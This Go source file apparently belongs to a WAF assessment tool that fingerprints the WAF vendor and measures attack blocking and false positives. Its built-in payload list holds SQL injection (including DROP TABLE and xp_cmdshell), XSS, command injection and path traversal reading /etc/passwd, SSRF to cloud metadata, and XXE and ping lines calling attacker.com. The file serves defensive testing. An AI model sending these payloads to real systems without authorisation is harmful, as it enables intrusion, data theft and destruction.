// Package assessment provides unified WAF security assessment.
// Combines attack testing and false positive testing with enterprise-grade metrics.
package assessment

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/waftester/waftester/pkg/corpus"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/metrics"
	"github.com/waftester/waftester/pkg/ui"
	"golang.org/x/time/rate"
)

// Config holds assessment configuration
type Config struct {
	TargetURL     string
	Concurrency   int
	RateLimit     float64
	Timeout       time.Duration
	SkipTLSVerify bool
	Verbose       bool
	HTTPClient    *http.Client // Optional custom HTTP client (e.g., JA3-aware)

	// Attack testing options
	PayloadDir       string
	Categories       []string
	MinSeverity      string
	EnableMutations  bool
	MutationEncoders []string

	// FP testing options
	EnableFPTesting  bool
	CorpusSources    []string
	CustomCorpusFile string
	LeipzigLanguage  string

	// Output options
	OutputFormat string // json, console, sarif, html
	OutputFile   string

	// WAF detection
	DetectWAF bool
}

// DefaultConfig returns sensible defaults for assessment
func DefaultConfig() *Config {
	return &Config{
		Concurrency:     25,
		RateLimit:       100,
		Timeout:         httpclient.TimeoutProbing,
		EnableFPTesting: true,
		CorpusSources:   []string{"builtin"},
		LeipzigLanguage: "eng",
		OutputFormat:    "console",
		DetectWAF:       true,
	}
}

// Assessment performs comprehensive WAF testing
type Assessment struct {
	config        *Config
	httpClient    *http.Client
	limiter       *rate.Limiter
	corpusManager *corpus.Manager
	calculator    *metrics.Calculator

	// Progress tracking
	totalTests     int64
	completedTests int64
	startTime      time.Time

	// Results
	attackResults []metrics.AttackResult
	benignResults []metrics.BenignResult
	resultsMu     sync.Mutex

	// WAF info
	detectedWAF string
}

// New creates a new Assessment
func New(cfg *Config) *Assessment {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	// Use provided HTTPClient (e.g., JA3-aware) or create default
	var httpClient *http.Client
	if cfg.HTTPClient != nil {
		httpClient = cfg.HTTPClient
	} else {
		httpClient = httpclient.Default()
	}

	return &Assessment{
		config:        cfg,
		httpClient:    httpClient,
		limiter:       rate.NewLimiter(rate.Limit(cfg.RateLimit), int(cfg.RateLimit)),
		corpusManager: corpus.NewManager("", cfg.Verbose),
		calculator:    metrics.NewCalculator(),
		attackResults: make([]metrics.AttackResult, 0),
		benignResults: make([]metrics.BenignResult, 0),
	}
}

// ProgressCallback is called periodically with progress updates
type ProgressCallback func(completed, total int64, phase string)

// Run executes the full WAF assessment
func (a *Assessment) Run(ctx context.Context, progressFn ProgressCallback) (*metrics.EnterpriseMetrics, error) {
	a.startTime = time.Now()

	// Phase 1: WAF Detection
	if a.config.DetectWAF {
		if progressFn != nil {
			progressFn(0, 0, "Detecting WAF...")
		}
		a.detectWAF(ctx)
	}

	// Phase 2: Load attack payloads
	attackPayloads, err := a.loadAttackPayloads()
	if err != nil {
		return nil, fmt.Errorf("failed to load attack payloads: %w", err)
	}

	// Phase 3: Load FP corpus
	var fpPayloads []corpus.Payload
	if a.config.EnableFPTesting {
		if progressFn != nil {
			progressFn(0, 0, "Loading FP corpus...")
		}
		fpPayloads, err = a.loadFPCorpus(ctx)
		if err != nil {
			// Non-fatal, continue without FP testing
			if a.config.Verbose {
				fmt.Printf("Warning: FP corpus load failed: %v\n", err)
			}
		}
	}

	// Calculate total tests
	a.totalTests = int64(len(attackPayloads) + len(fpPayloads))
	if progressFn != nil {
		progressFn(0, a.totalTests, "Starting tests...")
	}

	// Phase 4: Run attack tests
	if progressFn != nil {
		progressFn(0, a.totalTests, "Running attack tests...")
	}
	if err := a.runAttackTests(ctx, attackPayloads, progressFn); err != nil {
		return nil, fmt.Errorf("attack testing failed: %w", err)
	}

	// Phase 5: Run FP tests
	if len(fpPayloads) > 0 {
		if progressFn != nil {
			progressFn(atomic.LoadInt64(&a.completedTests), a.totalTests, "Running FP tests...")
		}
		if err := a.runFPTests(ctx, fpPayloads, progressFn); err != nil {
			return nil, fmt.Errorf("FP testing failed: %w", err)
		}
	}

	// Phase 6: Calculate metrics
	if progressFn != nil {
		progressFn(a.totalTests, a.totalTests, "Calculating metrics...")
	}

	duration := time.Since(a.startTime)
	result := a.calculator.Calculate(a.config.TargetURL, a.detectedWAF, duration)

	return result, nil
}

// detectWAF attempts to detect the WAF vendor
func (a *Assessment) detectWAF(ctx context.Context) {
	// Send a benign request first
	req, err := http.NewRequestWithContext(ctx, "GET", a.config.TargetURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return
	}
	defer iohelper.DrainAndClose(resp.Body)

	// Check headers for WAF signatures
	a.detectedWAF = detectWAFFromHeaders(resp.Header)

	// If not detected, try with a simple attack to trigger WAF response
	if a.detectedWAF == "" {
		testURL := a.config.TargetURL + "?test=<script>alert(1)</script>"
		req2, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			return
		}
		req2.Header.Set("User-Agent", "Mozilla/5.0")

		resp2, err := a.httpClient.Do(req2)
		if err != nil {
			return
		}
		defer iohelper.DrainAndClose(resp2.Body)

		body, _ := iohelper.ReadBody(resp2.Body, iohelper.SmallMaxBodySize)
		a.detectedWAF = detectWAFFromResponse(resp2.Header, resp2.StatusCode, string(body))
	}

	if a.detectedWAF == "" {
		a.detectedWAF = "Unknown"
	}
}

// detectWAFFromHeaders checks response headers for WAF signatures
func detectWAFFromHeaders(headers http.Header) string {
	// Cloudflare
	if headers.Get("CF-RAY") != "" || headers.Get("cf-cache-status") != "" {
		return "Cloudflare"
	}

	// AWS WAF - requires both x-amzn-requestid AND x-amz-cf-id
	// x-amz-cf-id alone is just CloudFront CDN, not WAF
	if headers.Get("x-amzn-requestid") != "" && headers.Get("x-amz-cf-id") != "" {
		return "AWS WAF"
	}

	// Akamai
	if headers.Get("X-Akamai-Transformed") != "" || headers.Get("Akamai-Origin-Hop") != "" {
		return "Akamai"
	}

	// ModSecurity
	server := headers.Get("Server")
	if strings.Contains(server, "ModSecurity") || strings.Contains(server, "OWASP") {
		return "ModSecurity"
	}

	// Imperva
	if headers.Get("X-Iinfo") != "" {
		return "Imperva"
	}

	// F5 BIG-IP
	if headers.Get("X-WA-Info") != "" || strings.Contains(server, "BigIP") {
		return "F5 BIG-IP"
	}

	// Azure WAF
	if headers.Get("x-azure-ref") != "" {
		return "Azure WAF"
	}

	// Sucuri
	if headers.Get("X-Sucuri-ID") != "" {
		return "Sucuri"
	}

	// Fastly
	if headers.Get("X-Served-By") != "" && headers.Get("X-Cache") != "" {
		return "Fastly"
	}

	return ""
}

// detectWAFFromResponse checks response body for WAF signatures
func detectWAFFromResponse(headers http.Header, statusCode int, body string) string {
	bodyLower := strings.ToLower(body)

	// Cloudflare
	if strings.Contains(bodyLower, "cloudflare") || strings.Contains(bodyLower, "cf-error") {
		return "Cloudflare"
	}

	// AWS WAF
	if strings.Contains(bodyLower, "aws waf") || strings.Contains(bodyLower, "request blocked") {
		return "AWS WAF"
	}

	// ModSecurity
	if strings.Contains(bodyLower, "modsecurity") || strings.Contains(bodyLower, "mod_security") {
		return "ModSecurity"
	}

	// Coraza
	if strings.Contains(bodyLower, "coraza") {
		return "Coraza"
	}

	// Generic nginx WAF block
	if statusCode == 403 && strings.Contains(strings.ToLower(headers.Get("Server")), "nginx") {
		return "nginx WAF"
	}

	return ""
}

// AttackPayload represents an attack test case
type AttackPayload struct {
	ID       string
	Category string
	Severity string
	Payload  string
	Method   string
	Location string // query, body, header
	Encoder  string
}

// loadAttackPayloads loads attack payloads from files or generates them
func (a *Assessment) loadAttackPayloads() ([]AttackPayload, error) {
	// For now, use a comprehensive built-in set
	// In full implementation, this would load from payloads directory
	payloads := getBuiltinAttackPayloads()

	// Filter by category if specified
	if len(a.config.Categories) > 0 {
		var filtered []AttackPayload
		categorySet := make(map[string]bool)
		for _, c := range a.config.Categories {
			categorySet[strings.ToLower(c)] = true
		}
		for _, p := range payloads {
			if categorySet[strings.ToLower(p.Category)] {
				filtered = append(filtered, p)
			}
		}
		payloads = filtered
	}

	return payloads, nil
}

// loadFPCorpus loads the false positive testing corpus
func (a *Assessment) loadFPCorpus(ctx context.Context) ([]corpus.Payload, error) {
	var allPayloads []corpus.Payload

	for _, source := range a.config.CorpusSources {
		switch source {
		case "builtin":
			c := a.corpusManager.GetBuiltinCorpus()
			allPayloads = append(allPayloads, c.Payloads...)

		case "leipzig":
			c, err := a.corpusManager.DownloadLeipzigCorpus(ctx, a.config.LeipzigLanguage, nil)
			if err != nil {
				if a.config.Verbose {
					fmt.Printf("Leipzig download failed, using extended builtin: %v\n", err)
				}
				// Fall back to extended builtin
				c = a.corpusManager.GetBuiltinCorpus()
			}
			allPayloads = append(allPayloads, c.Payloads...)
		}
	}

	// Load custom corpus if specified
	if a.config.CustomCorpusFile != "" {
		c, err := a.corpusManager.LoadCustomCorpus(a.config.CustomCorpusFile)
		if err != nil {
			return nil, fmt.Errorf("failed to load custom corpus: %w", err)
		}
		allPayloads = append(allPayloads, c.Payloads...)
	}

	return allPayloads, nil
}

// runAttackTests runs all attack tests concurrently
func (a *Assessment) runAttackTests(ctx context.Context, payloads []AttackPayload, progressFn ProgressCallback) error {
	taskChan := make(chan AttackPayload, a.config.Concurrency*2)

	var wg sync.WaitGroup
	for i := 0; i < a.config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range taskChan {
				select {
				case <-ctx.Done():
					return
				default:
				}

				a.limiter.Wait(ctx)
				result := a.executeAttackTest(ctx, payload)

				a.resultsMu.Lock()
				a.attackResults = append(a.attackResults, result)
				a.calculator.AddAttackResult(result)
				a.resultsMu.Unlock()

				completed := atomic.AddInt64(&a.completedTests, 1)
				if progressFn != nil && completed%10 == 0 {
					progressFn(completed, a.totalTests, "Attack testing...")
				}
			}
		}()
	}

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			close(taskChan)
			wg.Wait()
			return ctx.Err()
		case taskChan <- p:
		}
	}
	close(taskChan)
	wg.Wait()

	return nil
}

// runFPTests runs all false positive tests concurrently
func (a *Assessment) runFPTests(ctx context.Context, payloads []corpus.Payload, progressFn ProgressCallback) error {
	taskChan := make(chan corpus.Payload, a.config.Concurrency*2)

	var wg sync.WaitGroup
	for i := 0; i < a.config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range taskChan {
				select {
				case <-ctx.Done():
					return
				default:
				}

				a.limiter.Wait(ctx)
				result := a.executeFPTest(ctx, payload)

				a.resultsMu.Lock()
				a.benignResults = append(a.benignResults, result)
				a.calculator.AddBenignResult(result)
				a.resultsMu.Unlock()

				completed := atomic.AddInt64(&a.completedTests, 1)
				if progressFn != nil && completed%10 == 0 {
					progressFn(completed, a.totalTests, "FP testing...")
				}
			}
		}()
	}

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			close(taskChan)
			wg.Wait()
			return ctx.Err()
		case taskChan <- p:
		}
	}
	close(taskChan)
	wg.Wait()

	return nil
}

// executeAttackTest executes a single attack test
func (a *Assessment) executeAttackTest(ctx context.Context, payload AttackPayload) metrics.AttackResult {
	result := metrics.AttackResult{
		ID:       payload.ID,
		Category: payload.Category,
		Payload:  payload.Payload,
		Encoder:  payload.Encoder,
	}

	start := time.Now()

	// Build request based on location
	var req *http.Request
	var err error

	switch payload.Location {
	case "body":
		req, err = http.NewRequestWithContext(ctx, "POST", a.config.TargetURL,
			strings.NewReader("data="+url.QueryEscape(payload.Payload)))
		if req != nil {
			req.Header.Set("Content-Type", defaults.ContentTypeForm)
		}
	case "header":
		req, err = http.NewRequestWithContext(ctx, "GET", a.config.TargetURL, nil)
		if req != nil {
			req.Header.Set("X-Custom-Input", payload.Payload)
		}
	default: // query
		testURL := a.config.TargetURL + "?test=" + url.QueryEscape(payload.Payload)
		req, err = http.NewRequestWithContext(ctx, "GET", testURL, nil)
	}

	if err != nil {
		result.Error = err.Error()
		return result
	}

	req.Header.Set("User-Agent", ui.UserAgentWithContext("Assessment"))

	resp, err := a.httpClient.Do(req)
	result.Latency = time.Since(start)

	if err != nil {
		result.Error = err.Error()
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	result.StatusCode = resp.StatusCode
	result.Blocked = isBlockedResponse(resp.StatusCode)

	return result
}

// executeFPTest executes a single false positive test
func (a *Assessment) executeFPTest(ctx context.Context, payload corpus.Payload) metrics.BenignResult {
	result := metrics.BenignResult{
		ID:      payload.Text[:min(20, len(payload.Text))],
		Corpus:  payload.Source,
		Payload: payload.Text,
	}

	start := time.Now()

	// Test in query parameter
	testURL := a.config.TargetURL + "?input=" + url.QueryEscape(payload.Text)
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		result.Error = err.Error()
		return result
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := a.httpClient.Do(req)
	result.Latency = time.Since(start)

	if err != nil {
		result.Error = err.Error()
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	result.StatusCode = resp.StatusCode
	result.Blocked = isBlockedResponse(resp.StatusCode)
	result.Location = "query"

	return result
}

// isBlockedResponse determines if a response indicates WAF blocking
func isBlockedResponse(statusCode int) bool {
	return statusCode == 403 || statusCode == 406 || statusCode == 429 ||
		statusCode == 418 || statusCode == 503 || statusCode == 400
}

// SaveResults saves assessment results to a file
func (a *Assessment) SaveResults(m *metrics.EnterpriseMetrics, filename string) error {
	var data []byte
	var err error

	switch strings.ToLower(a.config.OutputFormat) {
	case "json":
		data, err = json.MarshalIndent(m, "", "  ")
	default:
		data = []byte(m.Summary())
	}

	if err != nil {
		return err
	}

	return os.WriteFile(filename, data, 0644)
}

// GetAttackResults returns the attack test results
func (a *Assessment) GetAttackResults() []metrics.AttackResult {
	a.resultsMu.Lock()
	defer a.resultsMu.Unlock()
	results := make([]metrics.AttackResult, len(a.attackResults))
	copy(results, a.attackResults)
	return results
}

// GetBenignResults returns the FP test results
func (a *Assessment) GetBenignResults() []metrics.BenignResult {
	a.resultsMu.Lock()
	defer a.resultsMu.Unlock()
	results := make([]metrics.BenignResult, len(a.benignResults))
	copy(results, a.benignResults)
	return results
}

// Helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// getBuiltinAttackPayloads returns a comprehensive set of attack payloads
func getBuiltinAttackPayloads() []AttackPayload {
	payloads := []AttackPayload{
		// SQL Injection
		{ID: "sqli-1", Category: "sqli", Severity: "Critical", Payload: "' OR '1'='1", Location: "query"},
		{ID: "sqli-2", Category: "sqli", Severity: "Critical", Payload: "1; DROP TABLE users--", Location: "query"},
		{ID: "sqli-3", Category: "sqli", Severity: "Critical", Payload: "' UNION SELECT * FROM users--", Location: "query"},
		{ID: "sqli-4", Category: "sqli", Severity: "Critical", Payload: "1' AND '1'='1", Location: "query"},
		{ID: "sqli-5", Category: "sqli", Severity: "Critical", Payload: "'; EXEC xp_cmdshell('dir')--", Location: "query"},
		{ID: "sqli-6", Category: "sqli", Severity: "High", Payload: "1 OR 1=1", Location: "query"},
		{ID: "sqli-7", Category: "sqli", Severity: "High", Payload: "admin'--", Location: "query"},
		{ID: "sqli-8", Category: "sqli", Severity: "High", Payload: "' OR ''='", Location: "query"},
		{ID: "sqli-9", Category: "sqli", Severity: "Medium", Payload: "1' ORDER BY 10--", Location: "query"},
		{ID: "sqli-10", Category: "sqli", Severity: "Medium", Payload: "1' WAITFOR DELAY '0:0:5'--", Location: "query"},

		// XSS
		{ID: "xss-1", Category: "xss", Severity: "High", Payload: "<script>alert('XSS')</script>", Location: "query"},
		{ID: "xss-2", Category: "xss", Severity: "High", Payload: "<img src=x onerror=alert(1)>", Location: "query"},
		{ID: "xss-3", Category: "xss", Severity: "High", Payload: "javascript:alert(1)", Location: "query"},
		{ID: "xss-4", Category: "xss", Severity: "High", Payload: "<svg onload=alert(1)>", Location: "query"},
		{ID: "xss-5", Category: "xss", Severity: "Medium", Payload: "'\"><script>alert(1)</script>", Location: "query"},
		{ID: "xss-6", Category: "xss", Severity: "Medium", Payload: "<body onload=alert(1)>", Location: "query"},
		{ID: "xss-7", Category: "xss", Severity: "Medium", Payload: "<iframe src='javascript:alert(1)'>", Location: "query"},
		{ID: "xss-8", Category: "xss", Severity: "Medium", Payload: "<input onfocus=alert(1) autofocus>", Location: "query"},

		// Command Injection
		{ID: "cmdi-1", Category: "cmdi", Severity: "Critical", Payload: "; cat /etc/passwd", Location: "query"},
		{ID: "cmdi-2", Category: "cmdi", Severity: "Critical", Payload: "| ls -la", Location: "query"},
		{ID: "cmdi-3", Category: "cmdi", Severity: "Critical", Payload: "`id`", Location: "query"},
		{ID: "cmdi-4", Category: "cmdi", Severity: "Critical", Payload: "$(whoami)", Location: "query"},
		{ID: "cmdi-5", Category: "cmdi", Severity: "High", Payload: "&& cat /etc/passwd", Location: "query"},
		{ID: "cmdi-6", Category: "cmdi", Severity: "High", Payload: "|| ping -c 5 attacker.com", Location: "query"},

		// Path Traversal
		{ID: "traversal-1", Category: "traversal", Severity: "High", Payload: "../../../etc/passwd", Location: "query"},
		{ID: "traversal-2", Category: "traversal", Severity: "High", Payload: "....//....//....//etc/passwd", Location: "query"},
		{ID: "traversal-3", Category: "traversal", Severity: "High", Payload: "..%2F..%2F..%2Fetc%2Fpasswd", Location: "query"},
		{ID: "traversal-4", Category: "traversal", Severity: "Medium", Payload: "/etc/passwd%00", Location: "query"},
		{ID: "traversal-5", Category: "traversal", Severity: "Medium", Payload: "....\\....\\....\\windows\\system32\\config\\sam", Location: "query"},

		// SSRF
		{ID: "ssrf-1", Category: "ssrf", Severity: "Critical", Payload: "http://169.254.169.254/latest/meta-data/", Location: "query"},
		{ID: "ssrf-2", Category: "ssrf", Severity: "Critical", Payload: "http://localhost:22", Location: "query"},
		{ID: "ssrf-3", Category: "ssrf", Severity: "High", Payload: "http://127.0.0.1/admin", Location: "query"},
		{ID: "ssrf-4", Category: "ssrf", Severity: "High", Payload: "file:///etc/passwd", Location: "query"},
		{ID: "ssrf-5", Category: "ssrf", Severity: "Medium", Payload: "http://[::]:22/", Location: "query"},

		// XXE
		{ID: "xxe-1", Category: "xxe", Severity: "Critical", Payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", Location: "body"},
		{ID: "xxe-2", Category: "xxe", Severity: "High", Payload: "<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">", Location: "body"},

		// SSTI
		{ID: "ssti-1", Category: "ssti", Severity: "Critical", Payload: "{{7*7}}", Location: "query"},
		{ID: "ssti-2", Category: "ssti", Severity: "Critical", Payload: "${7*7}", Location: "query"},
		{ID: "ssti-3", Category: "ssti", Severity: "High", Payload: "{{config}}", Location: "query"},
		{ID: "ssti-4", Category: "ssti", Severity: "High", Payload: "<%= 7*7 %>", Location: "query"},

		// LDAP Injection
		{ID: "ldap-1", Category: "ldap", Severity: "High", Payload: "*)(uid=*))(|(uid=*", Location: "query"},
		{ID: "ldap-2", Category: "ldap", Severity: "High", Payload: "admin)(&)", Location: "query"},

		// Header Injection
		{ID: "header-1", Category: "header", Severity: "Medium", Payload: "value\r\nX-Injected: header", Location: "header"},
		{ID: "header-2", Category: "header", Severity: "Medium", Payload: "value%0d%0aX-Injected:%20header", Location: "header"},

		// Log Injection
		{ID: "log-1", Category: "log", Severity: "Low", Payload: "user\n[CRITICAL] Fake log entry", Location: "query"},
	}

	return payloads
}
